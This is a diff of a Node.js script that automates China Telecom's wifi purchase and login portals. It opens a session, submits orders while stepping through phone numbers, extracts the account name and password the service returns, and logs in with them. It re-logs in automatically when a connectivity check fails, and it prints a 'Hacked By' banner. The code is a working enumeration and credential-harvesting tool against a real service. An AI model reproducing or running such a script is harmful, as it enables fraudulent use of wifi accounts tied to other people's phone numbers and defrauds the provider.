@@ -1,22 +1,14 @@
 var http = require('http');
 var querystring = require('querystring');
-try {
-    var colors = require('./colors');
-} catch (e) {
-    console.warn('缺少 colors 模块');
-}
+var colors = require('./node_modules/colors');
 
 var colorConsole = function (str, color) {
     // 彩色输出
     var colorful = str[color];
-    if (!colorful)
-        console.log(str);
-    else
-        console.log(colorful.bold);
+    console.log(colorful ? colorful.bold : str);
 };
 
-var httpPost = (function (querystring, http) {
-    // 发起 POST 请求
+var httpReq = (function (querystring, http) {
     var createOpt = function (opt) {
         var options = {
             method: 'POST',
@@ -34,13 +26,14 @@ var httpPost = (function (querystring, http) {
     };
 
     var post = function (opt, cb) {
+        // 发起 POST 请求
         var req = http.request(createOpt(opt), function (res) {
             res.setEncoding('utf8');
-            var output = '';
-            res.on('data', function (data) {
-                output += data;
+            var data = '';
+            res.on('data', function (chunk) {
+                data += chunk;
             }).on('end', function () {
-                cb(res, output);
+                cb(res, data);
             });
         });
 
@@ -53,54 +46,57 @@ var httpPost = (function (querystring, http) {
         req.end();
     };
 
-    return post;
+    var get = function (url, cb) {
+        // 发起 GET 请求
+        var req = http.get(url, function (res) {
+            res.setEncoding('utf8');
+            var data = '';
+            res.on('data', function (chunk) {
+                data += chunk;
+            }).on('end', function () {
+                cb(res, data);
+            });
+        });
+
+        req.on('error', function (e) {
+            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
+            reconnect();
+        });
+    };
+
+    return {
+        post: post,
+        get: get
+    };
 })(querystring, http);
 
-var checkNet = (function (httpPost) {
-    var check = function (cb) {
-        // 检测网络是否连接上
-        httpPost({
-                host: 'www.baidu.com',
-                path: '/index.html'
-            },
-            function (res) {
-                if (res.statusCode !== 200) {
-                    colorConsole('网络断开，开始下一组尝试...\n', 'grey');
-                    cb(true);
-                } else
-                    setTimeout(check, 10000); // 每十秒检测一次
-            });
-    };
-
-    return check;
-})(httpPost);
-
-var linkStart = (function (httpPost, checkNet) {
+var linkStart = (function (httpReq) {
     var init = {
-        cookie: null,
-        phone: undefined
+        cookie: undefined,
+        phone: undefined,
+        loginPath: undefined,
+        loginForm: null
     };
 
-    var openReq = function (phone) {
+    var openReq = function (curStatus) {
         // 发起请求，得到 cookie
         colorConsole('\n-->\n开始发起请求', 'yellow');
+        curStatus = curStatus || init; // 重新发起请求时直接从 init 获取数据
 
-        init.phone = init.phone || phone;
+        init.phone = curStatus.phone;
+        init.loginPath = curStatus.loginPath;
+        init.loginForm = curStatus.loginForm;
 
         if (init.cookie) {
             colorConsole('已存在 cookie：' + init.cookie + '\n', 'cyan');
             return addGood(); // 已存在 cookie 则直接进行下一步
         }
-
-        httpPost({
-                path: '/service/index.jsp'
-            },
-            function (res) {
-                var cookie = res['headers']['set-cookie'][0].split(';')[0];
-                init.cookie = cookie;
-                colorConsole('获得的 cookie：' + cookie + '\n', 'cyan');
-                addGood(); // 触发 addGood 请求
-            });
+        httpReq.get('http://wifi.189.cn/service/index.jsp', function (res) {
+            var cookie = res['headers']['set-cookie'][0].split(';')[0];
+            init.cookie = cookie;
+            colorConsole('获得的 cookie：' + cookie + '\n', 'cyan');
+            addGood(); // 触发 addGood 请求
+        });
     };
 
     var addGood = function () {
@@ -119,7 +115,7 @@ var linkStart = (function (httpPost, checkNet) {
             }
         };
 
-        httpPost(options, list);
+        httpReq.post(options, list);
     };
 
     var list = function () {
@@ -134,7 +130,7 @@ var linkStart = (function (httpPost, checkNet) {
             }
         };
 
-        httpPost(options, getOrder);
+        httpReq.post(options, getOrder);
     };
 
     var getOrder = function () {
@@ -158,23 +154,22 @@ var linkStart = (function (httpPost, checkNet) {
             }
         };
 
-        httpPost(options, function (res, data) {
+        httpReq.post(options, function (res, data) {
             if (data[0] === '1') {
                 // 得到订单号，开始尝试登录
                 var orderId = data.split(',')[1];
                 colorConsole('得到的订单号：' + orderId + '\n', 'cyan');
                 return getPwd(orderId);
-            } else {
-                if (data.indexOf('购物车为空') !== -1) {
-                    // 若没进行购物车添加，则重新发起请求
-                    colorConsole('购物车为空，将重置 cookie 后再次尝试！', 'magenta');
-                    delete init.cookie;
-                    return openReq();
-                }
-                // 否则递增电话号码重试
-                colorConsole(data.split(',')[1] + ' || 没有得到订单号，继续下一组尝试...\n', 'grey');
-                return getOrder();
             }
+            if (data.indexOf('购物车为空') !== -1) {
+                // 若没进行购物车添加，则重新发起请求
+                colorConsole('购物车为空，将重置 cookie 后再次尝试！', 'magenta');
+                delete init.cookie;
+                return openReq();
+            }
+            // 否则递增电话号码重试
+            colorConsole(data.split(',')[1] + ' || 没有得到订单号，继续下一组尝试...\n', 'grey');
+            return getOrder();
         });
 
         process.send(++init.phone); // 为下次计算做准备
@@ -192,10 +187,11 @@ var linkStart = (function (httpPost, checkNet) {
             }
         };
 
-        httpPost(options, function (res, data) {
+        httpReq.post(options, function (res, data) {
             colorConsole('收到的数据：' + data + '\n', 'cyan');
-            if (data.indexOf('次数过多') !== -1)
+            if (data.indexOf('次数过多') !== -1) {
                 return false;
+            }
             var t = data.split(','); // 获取有效信息
             if (t[4] && t[5]) {
                 hackLogin(t[4], t[5]);
@@ -209,45 +205,49 @@ var linkStart = (function (httpPost, checkNet) {
     var hackLogin = (function () {
         var isSecondTry = false; // 两次尝试计数
 
+        var checkNet = function (cb) {
+            // 检测网络是否连接上
+            httpReq.get('http://www.baidu.com', function (res) {
+                if (res.statusCode !== 200) {
+                    colorConsole('网络断开，开始下一组尝试...\n', 'grey');
+                    cb(true);
+                } else {
+                    setTimeout(function () {
+                        checkNet(cb);
+                    }, 10000); // 每十秒检测一次
+                }
+            });
+        };
+
         var login = function (uname, pwd) {
             // 登录
             colorConsole('开始登录...\n', 'yellow');
 
             var options = {
                 host: 'wlan.ct10000.com',
-                path: '/portal/login4V2.do',
-                contents: {
-                    username: uname,
-                    password: pwd,
-                    validateCode: '',
-                    postfix: '@wlan.sh.chntel.com',
-                    address: 'sh',
-                    loginvalue: 'null',
-                    basePath: 'http://wlan.ct10000.com:80/portal/',
-                    language: 'CN_SC',
-                    longNameLength: 32,
-                    NasType: 'Huawei',
-                    NasName: 'BJ-JA-SR-1.M.ME60', // BUCT 默认值
-                    OrgURL: 'null',
-                    isMobileRand: false,
-                    isNeedValidateCode: false
-                } // 登录表单，似乎所有项目都不能少
+                path: init.loginPath,
+                contents: init.loginForm
             };
+            options.contents.username = uname;
+            options.contents.password = pwd;
 
-            httpPost(options, function (res, data) {
+            httpReq.post(options, function (res, data) {
+                data = data.split(' ').join(''); // 去除空格
 
-                if (data.indexOf('passwd error' /* 登录失败会返回含有此字符串的网页*/ ) === -1) {
+                if (data.indexOf('("1"=="1")//登录成功' /* 登录成功会返回含有此字符串的网页*/ ) !== -1) {
 
-                    colorConsole('登录成功！八分钟后开始检查连接状态\t' + new Date().toTimeString().slice(0, 8) + '\n\n======= Hacked By Dolphin With Node.js =======\n', 'green');
+                    colorConsole('登录成功！十秒后开始检查连接状态\t' + new Date().toTimeString().slice(0, 8) + '\n\n======= Hacked By Dolphin With Node.js =======\n', 'green');
 
                     isSecondTry = false; // 重置计数
 
                     setTimeout(function () {
                         colorConsole('开始检查网络连接...\n', 'magenta');
                         checkNet(function (isOffline) {
-                            if (isOffline) getOrder();
+                            if (isOffline) {
+                                getOrder();
+                            }
                         });
-                    }, 480000); // 八分钟触发定时器
+                    }, 10000); // 八分钟触发定时器
 
                 } else {
                     if (isSecondTry) {
@@ -257,7 +257,7 @@ var linkStart = (function (httpPost, checkNet) {
                         getOrder();
                     } else {
                         // 电信渣服务器可能不能即时处理分配到的账号密码
-                        colorConsole('登录失败，3s 后再次尝试登录...\n', 'magenta');
+                        colorConsole('登录失败，三秒后再次尝试登录...\n', 'magenta');
                         setTimeout(function () {
                             isSecondTry = true; // 标记第二次尝试
                             login(uname, pwd);
@@ -271,7 +271,7 @@ var linkStart = (function (httpPost, checkNet) {
     })();
 
     return openReq;
-})(httpPost, checkNet);
+})(httpReq);
 
 var reconnect = (function (linkStart) {
     var count = 0;
@@ -295,9 +295,9 @@ process.on('message', function (curStatus) {
         colorConsole('\n主进程已重新启动！\n', 'yellow');
     }
 
-    linkStart(curStatus.phone);
+    linkStart(curStatus);
 }).on('uncaughtException', function (err) {
     // 异常抛出
-    colorConsole('Uncaught Exception ' + err, 'red');
+    colorConsole('Uncaught Exception ' + err.stack, 'red');
     process.exit();
 });
